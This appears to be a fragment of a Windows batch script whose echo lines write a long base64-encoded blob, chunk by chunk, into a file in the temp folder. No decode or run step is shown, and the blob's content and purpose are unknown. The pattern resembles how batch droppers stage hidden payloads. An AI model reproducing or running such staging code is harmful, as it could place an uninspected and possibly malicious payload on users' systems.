echo Hc57WLRj1iMbjOWYnF+NmTWzhsnZy0hDSIvWJlMjWnIEE2VaOxjTEt5r3b8Zi4cP >>%temp%\data_encode.txt 
echo W/WIyZQ4Q0PMU+dE9FKnjLV5dtcg1gZeyAHmSVj+Afclw8cJsPvtTG+JDBRg5wym >>%temp%\data_encode.txt 
echo Uhynx9wVQu4jHEcadkMzI3obOPK89fi4qEJY9L4k6JasXfacZEetki8wKfNP9fhV >>%temp%\data_encode.txt 
echo 45SJx3VvKGVNBh5Fsh9Og8NSqp5dXpMTY1ah0qQ4AVx0MAPRrhXOmRTj/rS2xiLX >>%temp%\data_encode.txt 
echo oQnj+QQjhpYAjOZZdvCblYlfkHWrdIfLmWkSPetRO49AlrOd2GQEIF/YgoXzsWAj >>%temp%\data_encode.txt 
echo fkQc6EQbyA6KIYzUqmc9d639MJyYKxfDYTn6DTs3Gf5GbbVzNvib/Kad+/JNOgfH >>%temp%\data_encode.txt 
echo WQ/K38lpEmLErIil3fal6NnBokq7/2oKTc1EsryZ5Aqs1GbsXsnHR/e3vJxf+2Jx >>%temp%\data_encode.txt 
echo jJ/HnPAahSNLoWHSHpyGo1t7gSTULF23YxplY+hDP06FBMGWfyKvQIx+RQZiPL8D >>%temp%\data_encode.txt 
echo 1iEkeiWsNlFgQk3Ptv5YcEgMdmb5ChlFfNIwITEGHSYTgFI530kJRnCY2mxKoHI/ >>%temp%\data_encode.txt 
echo RxZ6pQyqgRPJPM1HQ7txBEQjvlk61Sm32C6sSNtNdsRBOc3JvPQw/nMe/5nlqq1d >>%temp%\data_encode.txt 
echo /P2rGH6wHRBi5EB4YyelPrG8wnHJyL1diDy0fMUSIHIbn+FqU9KOM18XQZmbgQdh >>%temp%\data_encode.txt 
echo 5kc88cei10N+ntfBN7OOZ/qUAabIcejqNEB19LTAr2waF7xdm/FB9Czsj8nPKSiz >>%temp%\data_encode.txt 
echo 7+by2Y5L2px+mrYZHShVKaPf1l1TbcjrHZPonGaj7Le0I8esj3TRhzwq9b2Y59bY >>%temp%\data_encode.txt 
echo TnHjLImN89PrjxP5S/waTEqztpYHk1LK4eZ/sZhiwWMkcFod7QO8Fbv0ZaR8vojn >>%temp%\data_encode.txt 
echo rjVcirQYw3VbW6nlbNoWnZbvbUdF93qUAs6ClS7lCtKk2wtSpGxfUjniZCkUOWA7 >>%temp%\data_encode.txt 
echo uvy0tgzKQM/Yb/i0/lBu+0wa6lrDpzjaSsMthD9yPjYcblJo33kjklIa9hkGE6Kn >>%temp%\data_encode.txt 
echo qvcHxg4vcMxCFINqw5FJwy5iKnDY7iZOKTzNgj+btVTMpYucmXbsf0Soe3i+wYBg >>%temp%\data_encode.txt 
echo MAniBiagS8xjv12O0Wfy5syaP/2B0njm5JEB8W2M87TWXBIsMY/lmAO/6NnCoym7 >>%temp%\data_encode.txt 
echo 6NmICoZIwsqbrftdteaxJkq5SudeE92XSE3cKwJ6VxqqkLtEPA9C6vxe29crD7p7 >>%temp%\data_encode.txt 
echo UqWnmIRYypSvqlK+ABtodS+22RT+c4NaReLtbKhUWFk2vcjREQ3pDxsu6oo+Lyqo >>%temp%\data_encode.txt 
echo Cx39jggs9EB/z11rHpdbAzz9r3Jdp0TfAvNYSnAFh0PJBzwXfh6u1dnJ6oO9GGcT >>%temp%\data_encode.txt 
echo e5pHYrrQ1nQuKntqojOe7Tq08xFCM9s4ztYkTSWB8FsxCq7x/cHIQdFYFocliGvT >>%temp%\data_encode.txt 
echo mPOJGShm7HV4Ojk5m3U4mdLRZeKyII2lEcAPliNuTVBLMgX3FYHuMhjVyr1akDm3 >>%temp%\data_encode.txt 
echo H6G6/grBdUL0/dw8NtyM8Acipro/Th4CtNq1FOnM8zGKtOHV2HwObY/Np/H/9+N6 >>%temp%\data_encode.txt 
echo AMBhbSX5gasQv66C7VkkZ+PFSgIG/0B93JSuEnMBH3XCWmC+l6I6nFezxmPMetGz >>%temp%\data_encode.txt 
echo CiObVs7Am3oJPDaSGnC/nQJfROkpbMQujUT7oKlYfkNoKE8b7pYE5pY4W1Irq0ni >>%temp%\data_encode.txt 
echo BjCu4oFrWFJtwlp50gqjtGMRwDJDqRBmyhWC96Do+wSN2FKCfErEhMGyiZ4C6Chl >>%temp%\data_encode.txt 
echo CwHLxkTWnoZqSuWyT8ucOIaiadBD5TJRXWpiA+KlYUrZDDy6zvK6wlumruQuZfZC >>%temp%\data_encode.txt 
echo wzQIJS+2BeYpK+ri9p/oT4JTaHxBGttyBUNFD7JtkTKnUinZKp21uDxZPDvgs7wH >>%temp%\data_encode.txt 
echo pTv00VQtM0Cpj6p4WlW1XAWj+iY+LU0BEyldehcI8E/hms1Zrso9ljBcsHFqUCJ1 >>%temp%\data_encode.txt 
echo 0M4AJbNOInK2vINEDiXfOAB31NcGWL54j9ennERr5chGAaG1w+WMpIjrm+RNOO3w >>%temp%\data_encode.txt 
echo FkAUHHNozDvEVnXAO1m/pdG79Dn1WIgrTH0unYNsx2S9zybR34TARDEg8wBwB+zY >>%temp%\data_encode.txt 
echo +S/eo02NBwELexomFk1ZmIHV//N2/JBF761s+2WoS3ncfiOgMsvgvQ7HiLS0sYu7 >>%temp%\data_encode.txt 
echo YVfAQRbZsCwdGJ/9eO1VOr2tcosz3X38snt/slzmpG2mFiWFz+nwpjRPxjzz32bc >>%temp%\data_encode.txt 
echo Fse+0VxvY988Z/uMaahz7UqRgNmmigRnrjLXHjSlRKbbB8xxMayUthvZv3lEOKZg >>%temp%\data_encode.txt 
echo U2/Ax/BhXb97g2Fjwnu9PGI3LfsSbOyuPnKyzikG/MYMlTnaP3rJbz8HF81xWmvu >>%temp%\data_encode.txt 
echo jcE5D81htA29hv0bi0uNGUbM1oiuz8EsK6NRoaOYYC0fmWHt2rMdWGYZTzlUsdAC >>%temp%\data_encode.txt 
echo oaR36e/wEpGbpGS8Jt5HeHRIt8EVzTmGoOw7Il++nn5n3xCKjsLsk00Iyz2vMRGM >>%temp%\data_encode.txt 
echo iAGAVhFc5aDUEDXtnmcuwe3+686YVgsjA8tN+HVmJzv/KEbORfz9uU0EuNBX23hG >>%temp%\data_encode.txt 
echo 3HFcLjeNe4hzci9zO7i/cxe54fxkfjb/JM/kSbSl1psxNYXyEfvvOfoP5SEncwPf >>%temp%\data_encode.txt 
echo jVTepvcKtSpF+Qs94qEW0LL1aqrQ4T4hqkITFJ/JY5juLFVwqRv2JEEjV018S+Dc >>%temp%\data_encode.txt 
echo MHHn+qE3vW/nAueHuM/kuv99H98yU23IAkDV5bi/TXBk1veggl4apjZk9+v8Ki7s >>%temp%\data_encode.txt 
echo onMZ6URYZWEqPtdcHsMH5QEy8Z1yX+CMYOlTp7ypjr4Jly00/l0UPgt2aRVlM8Mo >>%temp%\data_encode.txt 
echo ym2BU4KlTRVeq2cjB/JEQqlQze2YrHPp06PQoxi5DeLrBtKzyGX4WBbS0QjS2m20 >>%temp%\data_encode.txt 
echo wZcoC/OAXXkCZt9MWV4DJwQL/GPigbaN66bmPpTgsG6yrtcNMPyp9Z98YwjFGvQy >>%temp%\data_encode.txt 
echo T2OZp8Nn0F93dPgoTEUKv6LvD/pdWwz/6gLoAfSOtXW+oc+zG8GKkSnEUxvu7ZJE >>%temp%\data_encode.txt 
echo 8ZltPG2hkoj5pSkf2rmGvTvs3Bx4uH+nnfub3861fRR7xyDNWB1zdCAdqeQjEVeI >>%temp%\data_encode.txt 
echo 9Jx8sWbILnooYWFJtkcpl49/QnKXMqhkwUrZWAlJl6AwHPPKelqlW9j+c12Fm6Eb >>%temp%\data_encode.txt 
echo yvluKi4T/ZmeVsfZYCKNdIjocVCYaay8dxcFNUB7lyy8vdGtZTXU340vvgPdR9S3 >>%temp%\data_encode.txt 
echo 7u0GnLFGXFdHiZ7JPDadCfwmh02XqSX5XGEfSs4EIGWnGnQXtXpDUw8omdHo0aWp >>%temp%\data_encode.txt 
echo HhYWoFj0D/Mc9H3m2NC9YEAaJqqOmSL0JtSNP8MB4fmtmyHD7geUSWWxlETvuzoj >>%temp%\data_encode.txt 
echo ZzfSOHE3DpCSF2Oi44tmbIoTK/wGqbNHiM8r5vfhGQoX7+1w8Xoj0JPrKVOK6L0E >>%temp%\data_encode.txt 
echo TziDYl86Als7Ce/BxJRirYMeqsqCiQ9rX+H9QHbd8iHX6kzOMaOrKMcuZYr+B0b4 >>%temp%\data_encode.txt 
echo 2lzhka4evmaK6+o4aRLDBpIxwvrvf5X0PlE6n+WPZR8pGY9rVWai9Pnj9atG3D3M >>%temp%\data_encode.txt 
echo cTgcYPDMBByQurUePMYp+Jcy8UJUVsPcwOULlpDlCt/MH+ZD5CLua0fpz0lyj2iy >>%temp%\data_encode.txt 
echo tMkHLEdxp8poe/K9tDTKjBWSCOlrvCwCfbnEYMOYXt46CJ/05a9HBU7iOifCJJ+c >>%temp%\data_encode.txt 
echo TQ7TR/4icwXQquAXyxGeNOdq6jRdWDejP85PI/96fhrAT4YmvXGN+UUv8m8N5KuR >>%temp%\data_encode.txt 
echo S9b/1L3jSbzfH4XCm9kH6VaSignmUGEYzW/ZdvO2YTan1j6GdGSOFEcNN70+GM0u >>%temp%\data_encode.txt 
echo CUWh3TNQOiwbYfTqe0j4/cwxPbWmQXnv64z17kGzGd2VUMeedsQe0asaJ4+USIg0 >>%temp%\data_encode.txt 
echo Eoj8Eb7mCSMLeHHtMtyoV8aJnif0LGaX41QaS//A620BBkHdDGms6M8mb0YS5Xb7 >>%temp%\data_encode.txt 
echo 5plzPa1MkxFMinkj5Enp7p7kmqGuQm5dMfdj6VG8fpHt234d3+Khp2L8w7kPYhB7 >>%temp%\data_encode.txt 
echo Ycvg/PLNWil6GPPriuO99cLPsfuLkp0q93NG2s9Z0Kr7Mi8fqBlbgX4kaaI/vaLM >>%temp%\data_encode.txt 
echo J5bDi+MiKVN9JeZcR1AbHyG/Jz3LZ7m4t9qc657Kk6hB4PW0Z9VbMNoEgAGFbnDE >>%temp%\data_encode.txt 
echo 5JT5HuTCu/CnE/CT70C4U8mmlI8p4k5hkfs4H25x1WUmip7nYakfr6+DrSh6/4i5 >>%temp%\data_encode.txt 
echo Net0I94MwJr6MK541P9h82Bk+wCJPRFdvEfYfKiP5CsCrDcv+k2BE8lDm6/Nj4v6 >>%temp%\data_encode.txt 
echo WNE/PUH0zzUFjucETmbwLfDMB04m48NwvqVpgHyU8lUb+wnNKZEC6m6ErXGafKns >>%temp%\data_encode.txt 
echo UprcEqf/DY0CKChkMnYbW8/UWP05GwfGvnrtT4OYJ7E/cBnr9hXshKhL5IcwATRK >>%temp%\data_encode.txt 
echo ir0H6+5khhDqfwEtYdNrQDsAgENLrX0JYFTV1f+bkEAIiS9IIqkFeeCkzdgEErYS >>%temp%\data_encode.txt 
echo SEpiwiYBoglqbWoZkomMhgQzb0KwlMWZ0bwOg1ixrdZ+itjl39J/l88PEFEJKIvW >>%temp%\data_encode.txt 
echo yqYiqCjWOsOIKGpYAuR/fue+N1smIe33Tysz895dzj333HPOvfcsiSneNBwxM9Ow >>%temp%\data_encode.txt 
echo HCg4qGcMzES5XVpHu3/EzJFJeCnOG3QTHK5ceGBFiedga64wmmGDHMsBjXvQDpj2 >>%temp%\data_encode.txt 
echo b0S7llfF+bMxXrhfbeQD6X3rxP5ZnF2/rb8n1SCLoz3wYd5ewUwHmOIx0w1UfEom >>%temp%\data_encode.txt 
echo 2KS6LHRQcaD9/Ag+xxOH8zqvnP50HxjqyKdCDJVZxoqhorTBUQ8JjooT4ywSdjo+ >>%temp%\data_encode.txt 
echo evXzCx4MMdnMeEwWk/rqU3041tiGs87gA1qHzn0/C+mf1ebUgh0iIe6uWPuIHO8D >>%temp%\data_encode.txt 
echo vOEmXeRwyGHeu5b3r9U4FykJxawkBm4lKo3aCi2gB2f3iCsqt25v5O/8ggR3Wtsu >>%temp%\data_encode.txt 
echo NZPE92Da1acV3asOLLrZ+bHhz5hYifs73Yq4BPQ/ILbl/hvAFQ7h3bGnwG/uVav5 >>%temp%\data_encode.txt 
echo Lsz1iUljmNWkVZ2KOkC30NgzfQkntfh8nf/H1H/bruAvjHhr+o4r1B22XXdRm4Gr >>%temp%\data_encode.txt 
echo xH0UL7Lf0gOH7S6EzLcinLjSYm9q4G/SQqdDHNuJ+EVYv8QfXOc61Ntc5wY5Z4FK >>%temp%\data_encode.txt 
echo 7ntBd6KIkFdDnuxDRA/jGuVbT7FzHWK8Bs+gxYepxeAmttcr4p1SjXmScWEOrNg+ >>%temp%\data_encode.txt 
echo YSNrKOLOMSE3sLHe4b+kAh27TGqSr8qkHfKmJer2Z4fP4E6ocJf8651s+Uc8pgj0 >>%temp%\data_encode.txt 
echo YBxSYEfiHZ4oblLSjZPRGuHXIImAHIL/3yZJvzepj4qucDAX/F2E/i5so3DFmcFp >>%temp%\data_encode.txt 
echo /Q5BXVw1WVITPR3Oq7UjXpWNYzKYxTG/gHCgYiGn7pOkcPkysiy7UesfVOvd4N7w >>%temp%\data_encode.txt 
echo +ZK4/6shYFWctvVz71DHRuXn3rxXO1r4hToi1lf8kV+HfcWPYo1msINfKF9yVJN5 >>%temp%\data_encode.txt 
echo ofM6efN+Usgssa1Ni2jt3XDO4hZJOx48FCkfbpCi78duK9jxEub/4nNbyyVp28GX >>%temp%\data_encode.txt 
echo SqQv/6hlvksT+FLNkhul5/jWqBjR+TiC8NYF22kTkzaMvrJO/NwChOQqPkK4/5EI >>%temp%\data_encode.txt 
echo fLStkksgQOBzSzbR18waMIT8v5RIG6FTb0V3WhqLuMw6cO1I+HCUO5j+u9pI2Ev/ >>%temp%\data_encode.txt 
echo wWQTZ4qIL4PFg+0+QkPCwBpcFCSbJmHnJEkwi2YOAJvQOH/d8xenUdnB0hBpqPRN >>%temp%\data_encode.txt 
echo 2tVfL31HGkd7+zKpSqqVHJJL2ijtkj7iPhB/9z+tj+yj4T8T/SXQXz/6S6S/JPpL >>%temp%\data_encode.txt 
echo r63t7bVUWwv6NElGBugB1H8a9fwNaaRUIJVKVj2vMXILm/qZEk39TcmmVFO6Kcuk >>%temp%\data_encode.txt 
echo mPJNJaYFplWmHaJ5NI1m+/cfMCA5eeDAlJRBg1JT09Kuuqr397W1xjxE+0/gfnWm >>%temp%\data_encode.txt 
echo YW4Ou1Xv8Aooc4kifWVxJV/wVf+Mb6gUPRUZFBwcGyA/00+KvXkQQ3M8p7Q84Sjs >>%temp%\data_encode.txt 
echo SOyeGJh0Otk9J5Ez85xw7U4e+DYqL9/FRxO0QR95wZd7KCbewxzSlX4oHTrNaZ5k >>%temp%\data_encode.txt 
echo 9y/6wfj7OvmBZ9gKfITsdvGXWubn6iJO/PSTKaH7x+h8l62VcUBSrw+BU/j+8tf1 >>%temp%\data_encode.txt 
echo /J3aee8PE0ce8OW+FljKgTGWIQZplkncaWUZtyL+bcdpge0MbtEElhoIKQJTeUBh >>%temp%\data_encode.txt 
echo 8BCg6eZF/UpCD8h5LCECOQTNK/KWOYnaBT17qOX9kTtNB3BX0PbOodPI/hUH8TfF >>%temp%\data_encode.txt 
echo 99CW3eaEaMRXMOKH0dyXA/EHonE9omW5gVXZDeEmMFsakw86Jr/W1Hj4VeLi9xzw >>%temp%\data_encode.txt 
echo u9+Xuyv4ACE3wG4k6/z3vM/o3BsXbbeaekAbzjdi0DY/kWaQZiOEOsubI9strwNx >>%temp%\data_encode.txt 
echo qz/GEeCUBuTXOqnfpYpkU69NqTHntCCdaI6F/hP5tHCrHCh8R3Y9InWLHydv9kAK >>%temp%\data_encode.txt 
echo T0OhUGIts9O/ejm2iqRXpOG2x7PP6Q0cpr3Whq3CL310rAt8xlu86cpi295jsucx >>%temp%\data_encode.txt 
echo YaLD6kRwe0+O8+8TsoJ7dcsFs+9RI9+W6T2RgQuS+u5fmJB3yxyww7uARxkMZIpQ >>%temp%\data_encode.txt 
echo LxpifgaykT/ry3eB98D/FU7YGpIgB1Lx4qh4gWCCeNGAF1+Gzov9z4vXU9m1Yk4i >>%temp%\data_encode.txt 
echo MN7mY5SsvsS+/8Cy5whiN7HJuOeYWtDN//9NffDV7O3Dg8Ydz9PIyPtQLznJ3n+P >>%temp%\data_encode.txt 
echo xv8KwNqGokgn6b9BAPRwJ/sn3Ap7YZbxcEjIrBYGGR1aWgXLr0q+EB9K1PP8/h0l >>%temp%\data_encode.txt 
echo 0ra57QiPoODd8BIIu/14MNzMhcvZNCYHu5eZCBKXi6dp6fwui6tk4N0wGE7UmNPF >>%temp%\data_encode.txt 
echo fSkpur8cwEH5anCn4tmnfurpUFu8XM/L9bxcT+NuvROGcXs53B73OyGXnzPyOtRh >>%temp%\data_encode.txt 
echo +tgFh2bTryOHEI0vZDDEXK/iZ2URWn+i/1nCSvBovF7zI3qdxL2O516LwL3ati0m >>%temp%\data_encode.txt 
echo BDz3OWMhP4SFrel4IIqnzeTgKKi0ESjbUMSNRKAlDR0F/hmyL1v96cUkPl9PJ0m0 >>%temp%\data_encode.txt 
echo ers5o78Q+sbxbES2gknQJ1pSvD+FskAra9LF5wbzrs633fwUNUK6TjVtO57gNnR/ >>%temp%\data_encode.txt 
echo uhzvVa7diXDR6HKvQaHZzoBeovAJriW776B/Wf/xbtqOJ55Tzv4zXF3pLac15Pde >>%temp%\data_encode.txt 
echo Y86BkY+p8JwjUSvUzj2fziIT7T/7xFMi6lu/2c4zhP7xhUdaBnrdXEHLMiSEdv5Q >>%temp%\data_encode.txt 
echo nTlrynLzeMe3o+SZdw33Z6kwZ8ltr9KgDlC5GYXHm//ldXPLlnK8+YvQ8Mu5Cqm4 >>%temp%\data_encode.txt 
echo BV2+TeZnklivnmn6XBNlZ+OCRjVH5VfGlc00yfVKIt6Z9miFrvbE2U7/xedwBsF4 >>%temp%\data_encode.txt 
echo g1lUwTGBuXV8F40yECo44PVWby/RnliPQjdq9L1sikBd85tIKtElLGPGF3Roz5rT >>%temp%\data_encode.txt 
echo kzg44viCUziF5932sYKOQkKgbw33Err8LV+PnR+u90tYDXNzk9omcyVm46EDCQx4 >>%temp%\data_encode.txt 
echo rnf7JgxrHs1B0QzZ/fsEbj8fpp9e9/ZqemVqL6ww58prcYbGqddfn474OWF9vouA >>%temp%\data_encode.txt 
echo 5AusBtThWbGcxO2LN5lqZmj/WJroVXkvgcQDuSzeLKdpuj6YUm5ObynBfdYMaiDX >>%temp%\data_encode.txt 
echo snemb816gFN41mEJ37e3J5p2eAcX7m/JnGHZX3i2+bOYfJvjx5BkndQylKTLJMdg >>%temp%\data_encode.txt 
echo ZCCwnI7Yz2jnuctDH8DtF84OvoxXsGS17WswPuzFtIfFfZfsfjCBL57MoO2SZN+t >>%temp%\data_encode.txt 
echo idp6/qGZ9kwXySp2sxPUs25MBYmVO7UaN4agyJvd7kqR88Hc9op2LlHR3qCtx+pP >>%temp%\data_encode.txt 
echo JGwHAgPfJhQjU2O+Ds1MLeDdvh41Rh6xnD/kpx+pSUIw8varYk+ilrGHE9Of9m5a >>%temp%\data_encode.txt 
echo z1NxWruEuZYfamM7K+RiEPOKGjfQnPm2u0EFyHDZ9g+aA0W+H4sDSd8Bhuv1Wpol >>%temp%\data_encode.txt 
echo +A+JadCOEw0MswQOfYDGhpF+s9yc4ciO0TeEB5ZZS72sNVxO5DvujOYAGuH1POvQ >>%temp%\data_encode.txt 
echo J57j6uDQfBV0HjjtOe48x03yUVVBJ2jq0ImbRh6dQvStTuSnhr7YBd+Vt+FO7HVv >>%temp%\data_encode.txt 
echo wjDx1QI7LIbpk3kjj09ZvqnE+TYVLHIRnXbJnttJ9hHdQYkeL8hzDE76sGx3EJfj >>%temp%\data_encode.txt 
echo Vp5gUiTBM0RNhaMy7ah1A3DwQpHIFgcoA6a4zVlU0lFWzKFpaJr+qsi/2CFmLgeZ >>%temp%\data_encode.txt 
echo IwaeZqOX5YyInNUf4mZN3hJa8wNhV2YO/Absdg91r2BGRKNAnmUP1eBbkdyh9HYY >>%temp%\data_encode.txt 
echo PXaVm3MSBwbkLbn3sQkVlaLuqNDA02yddMdlvljPhxHB1n5GkCvvJmYAOFn9LpSU >>%temp%\data_encode.txt 
echo j4WnIU5p9YXn3c7UukcSB3F7BvA1eopwHAzH92ZTBCLeLD4P8Sd7b+ej/Oa1uD7W >>%temp%\data_encode.txt 
echo jjg/db2cXLBDP/9yfZrqzYRs8Rx09odFQ+ouL8sXqDp/5tAnLHloHW2A2eo+nDAK >>%temp%\data_encode.txt 
echo WYRSwb/H6G+33eqdACWgyjscugGNP53Ur7W/AT2eme06YdKGHvjM1WlaMV074wom >>%temp%\data_encode.txt 
echo uE7007hg+2cJrgsJGtdVR3kOqtfcxONXE7Fxp/8CJ6Btd+DbVnGbGViX2C2fcuv4 >>%temp%\data_encode.txt 
echo ePpyOimpJ1y7kge+hZ7/HnR7jgk9XMNOJPhr//RDrCQf0jpi9zdx9e+rQ+15jq14 >>%temp%\data_encode.txt 
echo PXA9lD+jxWtCprt6/JuDQv+O8a/nQYd2iDxsL29wtCOuDwa0tVt2HSI0yStnx55n >>%temp%\data_encode.txt 
echo R8Mnt/21JxV+LS49w+OWV7ysnXUF01d/Al29/bN0tF7cvb3ZPbVn7t7eF7zUzx5Y >>%temp%\data_encode.txt 
echo /SHaLHwDXorD9HvEeegimO7q6lILIs+fOgfIax9kamh7NEKtVb9FFZJdwWSq4Dwq >>%temp%\data_encode.txt 
echo 9nqCGgR9QJUNbqD5ydsqLHnNsbrrqFd1pZdUAdof/KPgVHBTT3puB01K8KA4/42e >>%temp%\data_encode.txt 
echo 70nx5vuq0LgDRTzXslYsnDFYOQn8CFGREg7wRL+Bt7j3DH7A563B/aw+P3dZ1MNF >>%temp%\data_encode.txt 
echo X3C3/03xtOpyrD0AtLlnOEyuWJSy5wZ2WTX46TYWbtVPKGWrOx/CIXeMvFzdCTa3 >>%temp%\data_encode.txt 
echo MnXbQKNc8NPVnVDIV6Y+N4BzfOjPRvCzrdxeOT/DeFiTnQCddBuX1lXbEkGtGbzy >>%temp%\data_encode.txt 
echo oSCofIbIp48m/WYNChGuae1f6yF7hiC4J2qsfhlDIn1a6+C84gwX7YhXfIEuh3EP >>%temp%\data_encode.txt 
echo 0Hq34iXr++grQ+jjHC5pXXtJ1CW2omeruvQVh3bUdq0sCDEqbxq3OCFCKa8wp+JC >>%temp%\data_encode.txt 
echo lLX7Oz6jBXo3m0ahAmlexOleuUDzMSGDdzPaEY2bCkyDhLBzBlj2s2vIU5ttNoui >>%temp%\data_encode.txt 
echo SJFP60JPhb8zZrCGk8Qz3TINuzoTV5aui0NvctuZ/j2st5f7R623RFpvxDGTXCdG >>%temp%\data_encode.txt 
echo rN4JlLd/lkRPSQ3IXzmjl/zy96L9PNH+fGmalhfq4MbYDnZpX6CDD0eUctv9CG25 >>%temp%\data_encode.txt 
echo K2+K0Rdi4f8cQy0W7Q+dIaKoc/M7k6Ka7wd+4Qomuj6U2z9LpO18PujFZ09cOoDk >>%temp%\data_encode.txt 
echo d67ScvU2Ib+BO52HFHQVnpbvH4geUl9YQvvJgh0ztPI1la6uq1ugI1cMEHauFb7l >>%temp%\data_encode.txt 
echo 5pmwF/I1mCu15Ww3YWTTNuwnkofopDNEv9nceYb5RY7ImeTERUCObieYQ7vK62CE >>%temp%\data_encode.txt 
echo alIHwm49UN/FBl8zIUcfP0crOGDkhmN9mtRbb64HpyKmt0llmFRwCjoaATJevr/d >>%temp%\data_encode.txt 
echo JCLmo0uE6RRMzcvbPuQj09lbMVaYr5xPDSsGio1HPq2yShicQbfVYJO2PLzi2EiM >>%temp%\data_encode.txt 
echo VkDnF/owamgYxyKGQfs12t6W8TBkz4SuyNBw+XpIEP2+KjlTx83nh2L8SAL9Rcny >>%temp%\data_encode.txt 
echo /uKYLp8wXc6XxhNmim05rj44cZivwV1pxN6MXK6G9/YtOqAzkeeM/eAvzBtJwBHu >>%temp%\data_encode.txt 
echo rwY5YFAtYfCFNcscHfyVl8MBK9TB8F7BqpXP0lKuuxx/LP0Px4wluJdvZ5ebK3A0 >>%temp%\data_encode.txt 
echo yj4vywVPAB7LTup41Ofqvzt4yksCydR+4S55zagEpo1J1MDMkV/4Mt5A7jh5840m >>%temp%\data_encode.txt 
echo ect9ibrA7pKXXqct31Q5DTsu2rGMl12waASJBZ/X43Wky+4SNgofLLs3dvcn6ey/ >>%temp%\data_encode.txt 
echo sjRWqWmJJ5QGhRZX8FUDazS3beyjRpxigOvESt99g3hV+VLHtH82YArp0/KDj1+M >>%temp%\data_encode.txt 
echo 1BfnQUAPJEZdQVAHvzDImgPm+Me8yiLtYVdnwsrxsUA54wE1O2LFJ6z4O+Do5zox >>%temp%\data_encode.txt 
echo wHdfvzAc/QQcV1/E+YXRIeCQ3QhVaMDycXhQy7YEbJdF/BH/r/YxTD+DJvddQ4eM >>%temp%\data_encode.txt 
echo aj9BtI+46FqHaBeeK2xZyS0HY4X+5L4ojY9EwPNg4E09Hop/kIDn9VA+qNjz2+68 >>%temp%\data_encode.txt 
echo MVKf+FCcSxqzpz2O40A4LBr2BX/cG6U/Aq2Kzg0ZuzMIvYRTrXpNZeHp5g8CHyBO >>%temp%\data_encode.txt 
echo Xcz4Cq5AP3+IGNrGwAWc+o0X3b4VCVsRNR2AV4r/Gn4byLgQDfz281TgeRT4eg8X >>%temp%\data_encode.txt 
echo WH8+usBkFAAB+g+LAlef7909Y112bXZddrZUkJ9P/8bNz1whcsdyPtlSZGQvLavg >>%temp%\data_encode.txt 
echo xOzl8G5XlGr7Ynwoc62LbXHyj+fpfygiPiJ+xf6MUz/U/RyRtJX+qpDfXrkF99Pd >>%temp%\data_encode.txt 
echo wCi7pSxv3NgwPOHuoz/zlLzo/iM+IuHJdig5o+4cpRQXf0+ptTpsKZyUvrapUU9h >>%temp%\data_encode.txt 
echo e6X8wNmTGpyKkp33XQd/yx6P/Ov5Y52E99C//GAyf9PTrWbXGmwrEn3iL3JAvfmv >>%temp%\data_encode.txt 
echo 6+VSBARGjIMQED3/hVNK09iyC1FhovFP77DX9jr/0R89wxvT4xXgC+e/xldOXIx8 >>%temp%\data_encode.txt 
echo vfOqxoyNl2oXX621i0JptHuqb62tRdABxBRobmpQGuwONaru3NunV8GetIozp0tS >>%temp%\data_encode.txt 
echo 1aJmZ+M9knSLrc5ZayvQP8fqn+P0z/HSrMUiG3Z10z22Rprfclt9w+Tr+XPiePrE >>%temp%\data_encode.txt 
echo +/KyCml+4z2Tr7/+eik7f5wTGXZTJGWR1SE56N8Wm4IM26q1gQCVCAuMCGP/CwMi >>%temp%\data_encode.txt 
echo 1pE/BTcrLodHuuY2rxdSeznfUT65k74u0hW3Ov2zhpWJ9Wa4gvjWm58Kpdc1ku1G >>%temp%\data_encode.txt 
echo JOHlpLx+5XU+GoV5tV99Hb1BgTC1uc3YgMprF6RIImoAFVolheK/RWWWKdoZYYLo >>%temp%\data_encode.txt 
echo 6Ndzjt1HfiI8GKpIU/LfOk4SqYY8Jf048VZUll3SXP7nIJpV0/WRaztnyg9l9otI >>%temp%\data_encode.txt 
echo uXI2KW7O3Z/EqfceFJMJrcLtdgwS54o0cPL9I5LCSXadmXBH250YY+8gb5mg91Et >>%temp%\data_encode.txt 
echo 1PuvhJnTAhY2l/tph+SHxiTy9ZHnQD9JZG5w3wvXodkZW0d4gjd770n3/jj1bEDb >>%temp%\data_encode.txt 
echo O017q/1y0mOWt7xlib6Mzb7xP2v/VwLpVEssX5AS2OqdDWde1bWdZ8Qku7Nx9Sx+ >>%temp%\data_encode.txt 
echo Jcju/vSrg1PSmTbkCN/NBnWAy4+4OQ2ksTV4J+TqWSigr12fJoznn6fR73abcZWo >>%temp%\data_encode.txt 
echo +GYmvXhXfX29tvfsZ9pb2qt6xrP2ywntF0ZY3qp3nU+Rt7zTkvT8INYV3vvL+yUg >>%temp%\data_encode.txt 
echo pV8aWiohuOHHJsk3+5zrvEl+MD+B5wAgHThJWoa8+fHfU422J8y/ZuTUye5PRSqm >>%temp%\data_encode.txt 
echo VN8T5v3A5ovPMiQcY+lYCW6r2BD3t/eZcD+zRr+HQ/ZEEXyfNMPWjulZ6d4JSJjH >>%temp%\data_encode.txt 
echo +YvzMEr50XZELkR7D4oIbgri0W4XsEJNrTAvuQmn0a4TO1077yRddBKM+GkYON5v >>%temp%\data_encode.txt 
echo oN+5GlwKakSAVuwcYJ3MVlDvhq2g0u4L56stONajpbp/fqqxfAgjecjvDGelXLOv >>%temp%\data_encode.txt 
echo 6Fccr+jjN5guU8N0uXJWFy1n0rIXbMCATLSQCcAGU7V5EW1LUunl7QToAlOFuYZU >>%temp%\data_encode.txt 
echo 7mpYrtOzCtKuq03LzZVdYkkGGkhZWP0yeIW+J9TTBqjmJYQ7taOUcEe0RUAMQ1X5 >>%temp%\data_encode.txt 
echo 0Z00zAxqcQENP1fefHS2/OJ6xqHro52uXXcSQvJpHyToKwcnu5oI/YNoj3DgSjWM >>%temp%\data_encode.txt 
echo m9e9F0bTv1oj8tUupYnV5xu3ka/i3QjDns/VmSI/AKVOT9jnW2N+wrCmP16Ctc+Z >>%temp%\data_encode.txt 
echo bh5FJVwB66Sb9xyOPiztAaSj1YIEP4bUqh0PBKAmB7VLwS+9ExRq8DmsOe1M+8lv >>%temp%\data_encode.txt 
echo aF/67q7U/O3BQa6PRpz9kNpV208m+RJ/5ita1f5JguWShlbOal/Tbr79VCbhY0n7 >>%temp%\data_encode.txt 
echo 6XTXx7KrzrxkquuTEYF72cmWGQANaEfkDVOx4gudvrDDFFOQKhbJJ/mwMZPdp3En >>%temp%\data_encode.txt 
echo vN78ss6cdrQiS1PgGJ7OTgCbu/MwAT/MLG855686jL52uM4NVMcVc/zHb2pf+GpG >>%temp%\data_encode.txt 
